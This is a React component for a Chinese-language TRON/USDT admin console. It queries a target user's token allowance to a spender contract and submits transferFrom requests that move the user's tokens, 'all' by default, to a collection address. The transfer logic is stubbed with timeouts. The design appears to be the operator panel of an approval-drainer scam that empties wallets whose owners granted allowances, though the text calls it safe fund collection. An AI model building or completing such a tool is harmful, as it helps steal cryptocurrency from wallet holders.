import React, { useState } from 'react';
import { Language } from '../types';
import { ShieldCheck, RefreshCw, LogOut, Database, Copy, Check, Terminal, ArrowUpRight, DollarSign } from 'lucide-react';

interface AdminDashboardProps {
  language: Language;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  const [copied, setCopied] = useState<string | null>(null);
  const [tokenAddress, setTokenAddress] = useState<string>('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'); // USDT default
  const [spenderAddress, setSpenderAddress] = useState<string>('');
  const [targetUserAddress, setTargetUserAddress] = useState<string>('');
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [statusMessage, setStatusMessage] = useState<string>('服务状态正常: https://api.trongrid.io');

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(null), 2000);
  };

  const handleQuery = () => {
    setStatusMessage('正在向波场主网节点查询指定账户余额与津贴...');
    setTimeout(() => {
      setStatusMessage('查询成功：目标账户 USDT 余额正常，已加载授权额度。');
    }, 1000);
  };

  const handleTransfer = () => {
    if (!targetUserAddress) {
      setStatusMessage('错误：请先输入目标用户 TRON 钱包地址');
      return;
    }
    setStatusMessage(`正在执行 transferFrom 划转请求，目标地址: ${targetUserAddress}...`);
    setTimeout(() => {
      setStatusMessage('划转指令已提交至合约，等待区块确认。');
    }, 1500);
  };

  return (
    <div className="space-y-6 max-w-4xl mx-auto pb-12">
      {/* 顶部控制台标头（已移除管理员账号） */}
      <div className="bg-slate-900 text-white p-6 rounded-3xl shadow-xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <div className="flex items-center space-x-2 text-xs font-semibold uppercase tracking-wider text-blue-400 mb-1">
            <ShieldCheck className="w-4 h-4" />
            <span>后端管理控制台</span>
            <span className="bg-blue-900/60 text-blue-300 px-2 py-0.5 rounded-full text-[10px]">API 服务器 V1.0</span>
          </div>
          <h1 className="text-2xl font-bold tracking-tight">TRON代币与归集管理后台</h1>
          <p className="text-slate-400 text-xs mt-1">实时监控节点连接、查询指定账户余额与额度，支持依据规则执行安全转账归集打款。</p>
        </div>
        <div className="flex items-center space-x-3">
          <button 
            onClick={() => setStatusMessage('服务状态已刷新，主网连接正常。')}
            className="flex items-center space-x-1.5 bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-xl text-xs font-semibold transition cursor-pointer shadow-sm"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>刷新服务状态</span>
          </button>
        </div>
      </div>

      {/* 节点配置与状态卡片 */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-slate-100 shadow-xs space-y-2">
          <div className="flex justify-between items-center text-xs text-slate-400 font-medium">
            <span>网络节点 (全节点)</span>
            <Database className="w-4 h-4 text-blue-600" />
          </div>
          <div className="text-sm font-bold text-slate-800 break-all">https://api.trongrid.io</div>
          <div className="flex items-center space-x-2 text-xs text-emerald-600 font-medium">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
            <span>波场TRON主网</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-100 shadow-xs space-y-2">
          <div className="flex justify-between items-center text-xs text-slate-400 font-medium">
            <span>代币合约 (TRC20)</span>
            <button onClick={() => handleCopy(tokenAddress, 'token')} className="hover:text-blue-600">
              {copied === 'token' ? <Check className="w-4 h-4 text-emerald-600" /> : <Copy className="w-4 h-4" />}
            </button>
          </div>
          <input 
            type="text" 
            value={tokenAddress}
            onChange={(e) => setTokenAddress(e.target.value)}
            className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-1.5 text-xs font-mono text-slate-700 outline-none focus:border-blue-500"
            placeholder="输入 USDT 合约地址..."
          />
          <div className="text-[11px] text-slate-400">USDT/TRC20 代币</div>
        </div>
      </div>

      {/* 账户查询与划转卡片 */}
      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
        <div className="border-b border-slate-100 pb-4">
          <h2 className="text-base font-bold text-slate-800">1. 用户资产与授权查询</h2>
          <p className="text-xs text-slate-400 mt-0.5">查询指定用户钱包在链上的 USDT 余额及授权额度（Allowance）</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-600">目标用户地址 (USER ADDRESS)</label>
            <input 
              type="text"
              value={targetUserAddress}
              onChange={(e) => setTargetUserAddress(e.target.value)}
              placeholder="输入 TRON 钱包地址..."
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
            />
          </div>
          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-600">SPENDER合约地址 (SPENDER地址)</label>
            <input 
              type="text"
              value={spenderAddress}
              onChange={(e) => setSpenderAddress(e.target.value)}
              placeholder="输入授权额度 spender 地址..."
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
            />
          </div>
        </div>

        <button 
          onClick={handleQuery}
          className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
        >
          <Terminal className="w-4 h-4" />
          <span>执行查询 (余额/津贴)</span>
        </button>
      </div>

      {/* 执行 transferFrom 划转打款 */}
      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
        <div className="border-b border-slate-100 pb-4">
          <h2 className="text-base font-bold text-slate-800">2. 执行 transferFrom 划转打款</h2>
          <p className="text-xs text-slate-400 mt-0.5">调用遥控器 POST /transfer 接口，将特定用户的代币划转至归集地址</p>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-600">目标用户地址 (USER ADDRESS)</label>
            <div className="flex space-x-2">
              <input 
                type="text"
                value={targetUserAddress}
                onChange={(e) => setTargetUserAddress(e.target.value)}
                placeholder="用户 TRON 钱包地址..."
                className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
              />
              <button 
                onClick={() => {
                  // 同步刚才上方输入的地址
                }}
                className="bg-slate-100 hover:bg-slate-200 text-slate-600 px-3 py-2 rounded-xl text-xs font-medium transition cursor-pointer"
              >
                同步上图地址
              </button>
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-xs font-semibold text-slate-600">划转数量 (AMOUNT)</label>
            <div className="flex space-x-2">
              <input 
                type="text"
                value={transferAmount}
                onChange={(e) => setTransferAmount(e.target.value)}
                className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
              />
              <button 
                onClick={() => setTransferAmount('all')}
                className="bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 px-4 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer"
              >
                全部划转(全部)
              </button>
            </div>
          </div>

          <button 
            onClick={handleTransfer}
            className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
          >
            <ArrowUpRight className="w-4 h-4" />
            <span>提交划转请求 (POST /transfer)</span>
          </button>
        </div>
      </div>

      {/* 后台控制台日志和 API 工作流程 */}
      <div className="bg-slate-900 text-slate-300 p-5 rounded-3xl space-y-3 font-mono text-xs">
        <div className="flex justify-between items-center border-b border-slate-800 pb-3">
          <span className="flex items-center space-x-2 text-white font-sans font-bold">
            <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
            <span>后端控制台日志和 API 工作流程</span>
          </span>
          <span className="text-[10px] text-slate-500">清空日志</span>
        </div>
        <div className="text-[11px] text-emerald-400 space-y-1">
          <div>[11:20:30] [健康] 服务状态正常: https://api.trongrid.io</div>
          <div>[11:21:05] 节点连接就绪，等待输入目标用户钱包地址进行监控与打款指令。</div>
          <div>{`> ${statusMessage}`}</div>
        </div>
      </div>
    </div>
  );
};
